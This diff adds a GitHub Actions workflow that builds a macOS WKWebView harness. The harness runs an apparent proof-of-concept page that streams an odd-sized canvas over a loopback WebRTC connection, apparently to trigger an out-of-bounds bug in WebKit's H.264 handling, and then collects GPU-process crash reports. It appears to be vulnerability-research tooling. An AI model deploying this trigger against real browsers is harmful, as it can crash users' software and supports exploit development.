@@ -1,0 +1,185 @@
+name: dfe0d84a_workflow
+on:
+  workflow_dispatch:
+
+jobs:
+  dfe0d84a-webrtc-h264-oob:
+    runs-on: macos-latest
+    timeout-minutes: 30
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Setup WKWebView harness
+        run: |
+          mkdir -p harness
+          cat > harness/main.swift << 'EOF'
+          import Foundation
+          import WebKit
+
+          class AppDelegate: NSObject, NSApplicationDelegate, WKNavigationDelegate {
+              var window: NSWindow!
+              var webView: WKWebView!
+
+              func applicationDidFinishLaunching(_ notification: Notification) {
+                  let config = WKWebViewConfiguration()
+                  config.preferences.setValue(true, forKey: "allowFileAccessFromFileURLs")
+                  webView = WKWebView(frame: NSRect(x: 0, y: 0, width: 800, height: 600), configuration: config)
+                  webView.navigationDelegate = self
+                  window = NSWindow(
+                      contentRect: NSRect(x: 0, y: 0, width: 800, height: 600),
+                      styleMask: [.titled, .closable, .resizable],
+                      backing: .buffered,
+                      defer: false
+                  )
+                  window.contentView = webView
+                  window.makeKeyAndOrderFront(nil)
+
+                  let html = """
+                  <!DOCTYPE html>
+                  <html>
+                  <head><title>dfe0d84a PoC</title></head>
+                  <body>
+                  <canvas id="c"></canvas>
+                  <video id="v" autoplay muted playsinline></video>
+                  <script>
+                  (async () => {
+                      const canvas = document.getElementById('c');
+                      canvas.width = 321;
+                      canvas.height = 240;
+                      const ctx = canvas.getContext('2d');
+
+                      let framesSent = 0;
+                      const stream = canvas.captureStream(30);
+
+                      const pc1 = new RTCPeerConnection();
+                      const pc2 = new RTCPeerConnection();
+
+                      pc1.onicecandidate = e => e.candidate && pc2.addIceCandidate(e.candidate);
+                      pc2.onicecandidate = e => e.candidate && pc1.addIceCandidate(e.candidate);
+
+                      stream.getTracks().forEach(t => pc1.addTrack(t, stream));
+
+                      pc2.ontrack = e => {
+                          document.getElementById('v').srcObject = e.streams[0];
+                      };
+
+                      const offer = await pc1.createOffer();
+                      await pc1.setLocalDescription({ type: 'offer', sdp: offer.sdp });
+                      await pc2.setRemoteDescription(pc1.localDescription);
+                      const answer = await pc2.createAnswer();
+                      await pc2.setLocalDescription(answer);
+                      await pc1.setRemoteDescription(pc2.localDescription);
+
+                      const drawFrame = () => {
+                          ctx.fillStyle = `rgb(${Math.random()*255|0},${Math.random()*255|0},${Math.random()*255|0})`;
+                          ctx.fillRect(0, 0, canvas.width, canvas.height);
+                          ctx.fillRect(320, 0, 1, canvas.height);
+                          framesSent++;
+                          requestAnimationFrame(drawFrame);
+                      };
+                      drawFrame();
+
+                      setInterval(() => {
+                          console.log('DT-STATS: framesSent=' + framesSent);
+                      }, 2000);
+
+                      setTimeout(() => {
+                          console.log('DT-STATS: COMPLETE framesSent=' + framesSent);
+                      }, 20000);
+                  })();
+                  </script>
+                  </body>
+                  </html>
+                  """;
+
+                  let url = URL(string: "about:blank")!
+                  webView.loadHTMLString(html, baseURL: url)
+
+                  DispatchQueue.main.asyncAfter(deadline: .now() + 25) {
+                      NSApp.terminate(nil)
+                  }
+              }
+          }
+
+          let app = NSApplication.shared
+          let delegate = AppDelegate()
+          app.delegate = delegate
+          app.run()
+          EOF
+
+      - name: Build harness
+        run: |
+          swiftc harness/main.swift \
+            -framework Foundation \
+            -framework WebKit \
+            -framework AppKit \
+            -o harness/poc_runner 2>&1 || true
+
+      - name: Clear DiagnosticReports before run
+        run: |
+          mkdir -p ~/Library/Logs/DiagnosticReports
+          ls ~/Library/Logs/DiagnosticReports/ || true
+
+      - name: Run PoC (20s)
+        id: run-poc
+        run: |
+          timeout 25 harness/poc_runner 2>&1 | tee poc_output.txt || true
+          echo "Exit code: $?"
+        env:
+          CI: true
+
+      - name: DT-STATS
+        run: |
+          echo "=== DT-STATS ==="
+          grep "DT-STATS" poc_output.txt || echo "DT-STATS: no output captured (check DiagnosticReports)"
+
+      - name: check-crashes
+        id: check-crashes
+        run: |
+          echo "=== check-crashes ==="
+          DIAG_DIR=~/Library/Logs/DiagnosticReports
+          CRASH_COUNT=0
+
+          GPU_CRASHES=$(find "$DIAG_DIR" -name "*.ips" -newer harness/poc_runner -exec grep -l "com.apple.WebKit.GPU\|WebKit.GPU\|GPUProcess" {} \; 2>/dev/null || true)
+
+          if [ -n "$GPU_CRASHES" ]; then
+              echo "CRASH DETECTED — GPU process"
+              echo "$GPU_CRASHES"
+              for f in $GPU_CRASHES; do
+                  echo "--- $f ---"
+                  cat "$f" | head -80
+              done
+              CRASH_COUNT=$(echo "$GPU_CRASHES" | wc -l | tr -d ' ')
+          else
+              echo "NO_CRASH — no GPU process crash reports found"
+          fi
+
+          WK_CRASHES=$(find "$DIAG_DIR" -name "*.ips" -newer harness/poc_runner -exec grep -l "WebKit\|com.apple.webkit" {} \; 2>/dev/null || true)
+          if [ -n "$WK_CRASHES" ]; then
+              echo "WEBKIT CRASH DETECTED:"
+              for f in $WK_CRASHES; do
+                  echo "--- $f ---"
+                  cat "$f" | head -60
+              done
+          fi
+
+          echo "CRASH_COUNT=$CRASH_COUNT" >> $GITHUB_OUTPUT
+          echo "=== check-crashes END ==="
+
+      - name: Upload DiagnosticReports
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: diagnostic-reports
+          path: ~/Library/Logs/DiagnosticReports/
+          if-no-files-found: ignore
+
+      - name: Upload poc_output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-output
+          path: poc_output.txt
+          if-no-files-found: ignore
